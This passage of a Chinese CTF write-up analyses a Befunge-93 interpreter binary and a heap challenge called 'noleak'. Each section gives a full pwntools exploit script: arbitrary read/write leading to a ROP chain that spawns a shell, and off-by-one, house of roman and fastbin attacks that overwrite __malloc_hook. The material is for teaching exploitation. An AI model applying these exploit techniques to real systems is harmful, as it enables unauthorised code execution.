  __int16 v35; // [rsp+60h] [rbp-48h]
  unsigned __int64 v36; // [rsp+68h] [rbp-40h]

  v36 = __readfsqword(0x28u);
  alarm(0x28u);
  __sysv_signal(14, handler);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("Welcome to Online Befunge(93) Interpreter");
  puts("Please input your program.");
  v3 = program;
  do
  {
    __printf_chk(1LL, "> ");
    memset(s, 0, sizeof(s));
    v35 = 0;
    if ( !fgets(s, 82, stdin) )
      break;
    if ( s[0] )
    {
      v4 = strlen(s) + 1;
      if ( *((_BYTE *)&v33 + v4 + 2) == 10 )
        *((_BYTE *)&v33 + v4 + 2) = 0;
    }
    for ( i = 0LL; i != 80; ++i )
      v3[i] = s[i];
    v3 += 80;
  }
  while ( v3 != &program[2000] );
  step = 10001;
  do
  {
    if ( string_mode )
    {
      v6 = program[80 * y_offset + x_offset];
      if ( v6 == 34 )
        string_mode = 0;
      else
        push(v6);
    }
    else if ( bridge <= 0 )
    {
      v7 = program[80 * y_offset + x_offset];
      switch ( v7 )
      {
        case ' ':
          break;
        case '!':
          v22 = pop();
          push(v22 == 0);
          break;
        case '"':
          string_mode = 1;
          break;
        case '#':
          bridge = 1;
          break;
        case '$':
          pop();
          break;
        case '%':
          v18 = pop();
          v19 = pop() % v18;
          push(v19);
          break;
        case '&':
          __isoc99_scanf("%d", &v33);
          push(v33);
          break;
        case '*':
          v14 = pop();
          v15 = v14 * pop();
          push(v15);
          break;
        case '+':
          v10 = pop();
          v11 = pop() + v10;
          push(v11);
          break;
        case ',':
          v9 = pop();
          _IO_putc(v9, stdout);
          break;
        case '-':
          v12 = pop();
          v13 = pop() - v12;
          push(v13);
          break;
        case '.':
          pop();
          __printf_chk(1LL, &off_12F0);
          break;
        case '/':
          v16 = pop();
          v17 = pop() / v16;
          push(v17);
          break;
        case ':':
          v23 = pop();
          push(v23);
          push(v23);
          break;
        case '<':
          move = 2;
          break;
        case '>':
          move = 0;
          break;
        case '@':
          puts("\n");
          puts("Program exited");
          exit(0);
        case '\\':
          v24 = pop();
          v25 = pop();
          push(v24);
          push(v25);
          break;
        case '^':
          move = 3;
          break;
        case '_':
          move = pop() != 0 ? 2 : 0;
          break;
        case '`':
          v20 = pop();
          v21 = pop();
          push(v21 > v20);
          break;
        case 'g':
          v26 = pop();
          v27 = pop();
          push(program[80 * v26 + v27]);
          break;
        case 'p':
          v28 = pop();
          v29 = pop();
          program[80 * v28 + v29] = pop();
          break;
        case 'v':
          move = 1;
          break;
        case '|':
          move = pop() == 0 ? 1 : 3;
          break;
        case '~':
          v8 = _IO_getc(stdin);
          push(v8);
          break;
        default:
          if ( (unsigned __int8)(v7 - 48) <= 9u )
            push(v7 - 48);
          break;
      }
    }
    else
    {
      --bridge;
    }
    y_offset += dword_14E0[move];
    v30 = x_offset + dword_14F0[move];
    x_offset = v30;
    if ( y_offset == -1 )
    {
      y_offset = 24;
    }
    else if ( y_offset == 25 )
    {
      y_offset = 0;
    }
    if ( v30 == -1 )
    {
      x_offset = 79;
    }
    else if ( x_offset == 80 )
    {
      x_offset = 0;
    }
    --step;
  }
  while ( step );
  puts("Too many steps. Is there any infinite loops?");
  return 0LL;
}
```

程序是一个`befunge-93`的解释器，`befunge`的程序布局是一个二维的平面，如下：

```c
      Befunge-93                
      ==========       
   0      x     79                    
  0+-------------+                   
   |                                
   |                            
  y|                  
   |                                    
   |                               
 24+
```

### [Befunge-93 instruction list](https://en.wikipedia.org/wiki/Befunge)

|     `0-9`     |                Push this number on the stack                 |
| :-----------: | :----------------------------------------------------------: |
|      `+`      |         Addition: Pop *a* and *b*, then push *a*+*b*         |
|      `-`      |       Subtraction: Pop *a* and *b*, then push *b*-*a*        |
|      `*`      |      Multiplication: Pop *a* and *b*, then push *a***b*      |
|      `/`      | Integer division: Pop *a* and *b*, then push *b*/*a*, rounded towards 0. |
|      `%`      | Modulo: Pop *a* and *b*, then push the remainder of the integer division of *b*/*a*. |
|      `!`      | Logical NOT: Pop a value. If the value is zero, push 1; otherwise, push zero. |
|      ```      | Greater than: Pop *a* and *b*, then push 1 if *b*>*a*, otherwise zero. |
|      `>`      |                      Start moving right                      |
|      `<`      |                      Start moving left                       |
|      `^`      |                       Start moving up                        |
|      `v`      |                      Start moving down                       |
|      `?`      |         Start moving in a random cardinal direction          |
|      `_`      |      Pop a value; move right if value=0, left otherwise      |
|      `|`      |       Pop a value; move down if value=0, up otherwise        |
|      `"`      | Start string mode: push each character's ASCII value all the way up to the next `"` |
|      `:`      |             Duplicate value on top of the stack              |
|      `\`      |             Swap two values on top of the stack              |
|      `$`      |           Pop value from the stack and discard it            |
|      `.`      |    Pop value and output as an integer followed by a space    |
|      `,`      |           Pop value and output as ASCII character            |
|      `#`      |                    Bridge: Skip next cell                    |
|      `p`      | A "put" call (a way to store a value for later use). Pop *y*, *x*, and *v*, then change the character at (*x*,*y*) in the program to the character with ASCII value *v* |
|      `g`      | A "get" call (a way to retrieve data in storage). Pop *y* and *x*, then push ASCII value of the character at that position in the program |
|      `&`      |              Ask user for a number and push it               |
|      `~`      |      Ask user for a character and push its ASCII value       |
|      `@`      |                         End program                          |
| `    `(space) |                     No-op. Does nothing                      |

- 利用`&`，`g`和`,`的功能，我们有办法做到任意读。
  - 先通过&将x跟ypush到Stack上，x与y我们可控（32位整数）
  - 这边注意stack是程序在bss段自行模拟出来的一块，拥有类似的堆栈行为，并不是指程式真正的堆栈。
    `g`的功能是将`program[80 * x + y]`的内容`push`到Stack上。因为x与y我们可控，代表着我们可以将任意位址的内容push到Stack上。
    `,` 弹出stack顶端的值（可控）pop出来（1 byte），并印出他的数值。
 - 利用`&`和`p`的功能，我们还有办法做到任意写

   - 先穿透`&`将x，`y`与`z`push到stack上

   - p功能会先从堆栈弹出出3个值（x，y，z，均可控），之后将ž的值放入`program[80 * x + y]`（即`program[80 * x + y] = z`）。
- 还有一点要注意
  - 因为通过`&`功能将数值push进栈时，一次只能push一个整数（32位）。如果我们想要使`program[80 * x + y]`跳到很远的地方，x与y很有可能会需要是一个超过`integer`范围的数值，如此一来使用&功能将无法满足我们的需求。
  - 解决方法，利用的`*`功能。`*`会从堆栈弹出顶端两个出数值x与y，并将`x * y`的查询查询结果推回栈上。这里全程是使用64位寄存器进行操作，所以不会有整数32位的问题。
  - 因此，先通过`*`功能将stack顶端变成一个长整数，之后我们就可以利用上面的方法对任意位址做任意读写。

`got`表不可写，我们只能覆盖栈上的返回地址来执行shell。另外，我们还要泄露libc的值。

通过任意地址读，我们将`got`表中某函数的地址leak从而得到libc的基址，接下来，我们通过leak栈地址来覆盖返回地址，[参考博客](https://bamboofox.github.io/write-ups/2016/09/07/MMA-CTF-2nd-2016-Interpreter-200.html)，leak栈地址有以下几种方法(~~繁体就不翻译了，看多了就习惯了~~)：

- **leak stack 上的 saved rbp 或是 argv**。这部分通常是用在 format string 的漏洞，這題無法這樣做。
- **leak tls section 上的 stack address**。這部份比較進階，簡單來說就是程式在執行的時候，會有個 memory 的區塊叫做 tls section，裡面會存許多有用的東西，像是 stack canary, main_arena 的 address, 以及一個不知道指向哪裡的 stack address。而要透過這種方式 leak stack address，我們必須要有辦法知道 tls section 的位址，而這通常需要透過程式先呼叫 mmap，之後 leak mmap 出來的 memory address 來達成。這題因為沒有 malloc 或是 mmap，所以也無法透過這樣的方式來 leak stack address。
- **leak ld-linux.so 的 __libc_stack_end symbol**。如果我們有辦法知道 ld-linux.so 的位址以及版本，我們可以透過 leak 裡面的 `__libc_stack_end` 這個 symbol，來獲取 stack address。這題用這種方式理論上辦的到，我自己就是用這種方式 leak 的，只是做起來非常麻煩。解完這題之後，經詢問別人才發現原來還有第四種方式。
- **leak libc 里面的 environ symbol**。 libc 裡面有個 symbol 叫做 `environ`，裡面會存 stack address。因此這題比較漂亮的方式，是 leak libc 的 address 之後，直接 leak `libc.symbols['environ']` 來獲取 stack address。

我采用了最后一种方式，博客原文采用了第三种绕了一大圈。另外，这题似乎是MMA CTF 2nd 2016的Interpreter 200并非原创题。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
import sys

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"
context.terminal = ['tmux', 'splitw', '-h']

binary='./befunge'
#gdb.attach(sh)
if 'g' in sys.argv[1]:
	context.log_level="DEBUG"
if 'l' in sys.argv[1] and 'r' not in sys.argv[1]:
	sh=process(binary)
if 'r' in sys.argv[1]:
	sh=remote('101.200.201.114', 30002)

elf = ELF(binary,checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)

def cal_offset(addr, text_base):
    start_from = text_base + 0x202040
    offset = addr - start_from
    off_80 = offset/80
    off_1 = offset%80

    return off_1, off_80

def write(addr, text_base, value):
    cnt = 0
    off_1, off_80 = cal_offset(addr, text_base)
    temp = int(math.sqrt(off_80))
    off_1 = (off_80 - temp**2)*80 + off_1

    for i in range(off_1, off_1+6):
        v = (value>>(8*cnt)) & 0xff
        sh.sendline(str(v))
        sh.sendline(str(i))
        sh.sendline(str(temp))
        sh.sendline(str(temp))
        cnt += 1

base = 0x202040
program = '>'.ljust(79,' ')+'v'+'\n'
program+= 'v,g&&,g&&,g&&,g&&,g&&,g&&,g&&,g&&,g&&,g&&,g&&,g&&'.ljust(79,' ')+'<'+'\n' #leak libc 6bytes (1st: -2, 2nd: -48 ~ -43) #leak text 6bytes-56, -9
program+= '>&&&*g,&&&*g,&&&*g,&&&*g,&&&*g,&&&*g,'.ljust(79,' ')+'v'+'\n' #leak text 6bytes-56, -9
program+= 'vp*&&&&p*&&&&p*&&&&p*&&&&p*&&&&p*&&&&'.ljust(79,' ')+'<'+'\n'
program+= '>&&&&*p&&&&*p&&&&*p&&&&*p&&&&*p&&&&*p'.ljust(79,' ')+'v'+'\n'
program+= 'vp*&&&&p*&&&&p*&&&&p*&&&&p*&&&&p*&&&&'.ljust(79,' ')+'<'+'\n'
program+= ('v'.ljust(79,' ')+'<'+'\n')*17
program+= '>'.ljust(79,'>')+'v'+'\n'
program+= '^'.ljust(79,'<')+'<'+'\n'
sh.sendlineafter('>',program)
sh.recvuntil("> > > > > > > > > > > > > > > > > > > > > > > > ")

libc_leak = ''
for i in range(6):
    sh.sendline(str((-48)+i))
    sh.sendline(str(-2))
    rev = u8(sh.recv(1))
    libc_leak = libc_leak+p8(rev)
    leak(str(i),rev)
libc_leak = u64(libc_leak.ljust(8,'\x00'))
libcbase = libc_leak-libc.sym['__libc_start_main']
system = libcbase + libc.sym["system"]
env = libcbase + libc.sym['environ']
binsh = libcbase+ libc.search('/bin/sh').next()
leak('libc base',libcbase)
leak('binsh',binsh)

text_leak = ''
for i in range(6):
    sh.sendline(str((-56)+i))
    sh.sendline(str(-9))
    rev = u8(sh.recv(1))
    text_leak = text_leak+p8(rev)
    leak(str(i),rev)
textbase = u64(text_leak.ljust(8,'\x00'))-0xb00 
pop_rdi = textbase + 0x120c
start = base+textbase
leak('text base',textbase)
leak('pop rdi',pop_rdi)

off_1, off_80 = cal_offset(env, textbase)
temp = int(math.sqrt(off_80))
off_1 = (off_80 - temp**2)*80 + off_1
stack_leak = ''
for i in range(off_1,off_1+6):
    sh.sendline(str(i))
    sh.sendline(str(temp))
    sh.sendline(str(temp))
    rev = u8(sh.recv(1))
    stack_leak = stack_leak+p8(rev)
    leak(str(i-off_1),rev)
stack_leak = u64(stack_leak.ljust(8,'\x00'))-0xf0
leak('stack_leak',stack_leak)

write(stack_leak, textbase, pop_rdi)
write(stack_leak+8, textbase, binsh)
write(stack_leak+16, textbase, system)

sh.interactive()
```

# noleak

## check

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**add**

```c
__int64 add()
{
  __int64 result; // rax
  int v1; // [rsp+0h] [rbp-10h]
  int nbytes; // [rsp+4h] [rbp-Ch]
  void *nbytes_4; // [rsp+8h] [rbp-8h]

  puts("Input index:");
  v1 = sub_9E0();
  puts("Input size:");
  nbytes = sub_9E0();
  if ( v1 < 0 || v1 > 10 || nbytes < 0 || nbytes > 496 )
  {
    puts("index or size invalid!");
    result = 0xFFFFFFFFLL;
  }
  else
  {
    nbytes_4 = malloc(nbytes);
    puts("Input data:");
    read(0, nbytes_4, (unsigned int)nbytes);
    *((_QWORD *)&unk_2020C0 + 2 * v1) = nbytes_4;
    dword_2020C8[4 * v1] = nbytes;
    result = 0LL;
  }
  return result;
}
```

**dele**

```c
__int64 dele()
{
  __int64 result; // rax
  int v1; // [rsp+Ch] [rbp-4h]

  puts("Input index:");
  v1 = sub_9E0();
  if ( v1 >= 0 && v1 <= 10 && *((_QWORD *)&unk_2020C0 + 2 * v1) )
  {
    free(*((void **)&unk_2020C0 + 2 * v1));
    *((_QWORD *)&unk_2020C0 + 2 * v1) = 0LL;
    dword_2020C8[4 * v1] = 0;
    result = 0LL;
  }
  else
  {
    puts("Index invalid!");
    result = 0xFFFFFFFFLL;
  }
  return result;
}
```

**edit**

```c
__int64 edit()
{
  __int64 result; // rax
  int v1; // [rsp+Ch] [rbp-4h]

  puts("Input index:");
  v1 = sub_9E0();
  if ( v1 >= 0 && v1 <= 10 && *((_QWORD *)&unk_2020C0 + 2 * v1) )
  {
    puts("Input data:");
    sub_A34(*((_QWORD *)&unk_2020C0 + 2 * v1), (unsigned int)dword_2020C8[4 * v1]);
    result = 0LL;
  }
  else
  {
    puts("Index invalid!");
    result = 0xFFFFFFFFLL;
  }
  return result;
}
```

远程环境为16.04漏洞点在`edit`有`off-by-one`，但是要回车跳出循环或者将`size+1`的空间全部填满。

思路还是很简单的，使用`house of roman`来申请`io`leak libc。然后使用`fastbin attack`覆写`__malloc_hook`。

难点在堆的布局，

首先，申请五个chunk，chunk_3是`fastbin victim`大小为0x70，在这个chunk尾部伪造一个0x20大小的chunk，用以后面进行分割，并将其释放掉。

再通过`off-by-one`chunk_0伪造一个`unsorted chunk = chunk_1 + chunk_2 + chunk_3`，这个chunk要包含`fastbin victim`。

`edit`chunk_1将chunk_2的大小设为0x61，free(unsorted chunk)，这时再malloc(0x130)，`unsorted chunk`就会被分割，`unsorted bin`中只留下了chunk_3，而chunk_3在开始被加入了`fastbin`中。

free(chunk_2)，chunk_2被我们修改了大小，其尾部包含了`chunk_3`的头部，所以我们可以覆写其`fd`的低字节使其指向io_file就可以leak libc。

之后就简单的`fastbin attack`了。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
import sys

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"
context.terminal = ['tmux', 'splitw', '-h']
context.log_level="DEBUG"
binary='./pwn'

#gdb.attach(sh)
elf = ELF(binary,checksec=False)

def add(idx, size, content):
    sh.sendlineafter('choice:', '1')
    sh.sendlineafter('index:', str(idx))
    sh.sendlineafter('size:', str(size))
    sh.sendafter('data:', str(content))

def edit(idx, content):
    sh.sendlineafter('choice:', '3')
    sh.sendlineafter('index:', str(idx))
    sh.sendafter('data:', str(content))

def delete(idx):
    sh.sendlineafter('choice:', '2')
    sh.sendlineafter('index:', str(idx))


for i in range(0x100):
        try:
            sh = process('./pwn')
            # sh = remote("101.200.201.114", 30003)
            add(0, 0xf8, 'a'*8)
            add(1, 0xf8, 'a'*8)
            add(2, 0x30, 'a'*8)
            add(3, 0x60, ('a'*8).ljust(0x18, '\x00') + p64(0x21))
            add(4, 0x100, 'a'*8)

            add(5, 0x68, 'a'*8)
            add(6, 0x30, 'a'*8)
            add(7, 0x60, ('a'*8).ljust(0x18, '\x00') + p64(0x21))
            add(8, 0x60, 'a'*8)
            
            delete(3)
            edit(0, p64(0) * (0xf8 / 8) + '\xb1')
            edit(1, 'a' * 0xf0 + p64(0) + p64(0x61))
            delete(1)

            add(1, 0x130, 'a'*8)
            delete(2)
            add(2, 0x50, 'a' * 0x30 + p64(0) + p64(0x71) + '\xdd\x25')
            add(3, 0x60, 'a'*8)
            add(4, 0x60, 'A'*0x33 + p64(0xfbad1800) + p64(0)*3 + '\x00')
            
            libc = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3c5600
            leak('libc leak',libc)
            delete(7)
            edit(5, 'a' * 0x60 + p64(0) + '\x61')
            delete(6)
            add(6, 0x50, 'a' * 0x30 + p64(0) + p64(0x71) + p64(libc + 0x3c4aed))
            add(7, 0x60, 'a'*8)
            realloc = libc + 0x84710
            payload = 'a' * 0xb + p64(libc + 0x4527a) + p64(realloc + 6)
            add(7, 0x60, payload)
            leak('realloc',realloc)

            sh.interactive()
        except :
            pass
```

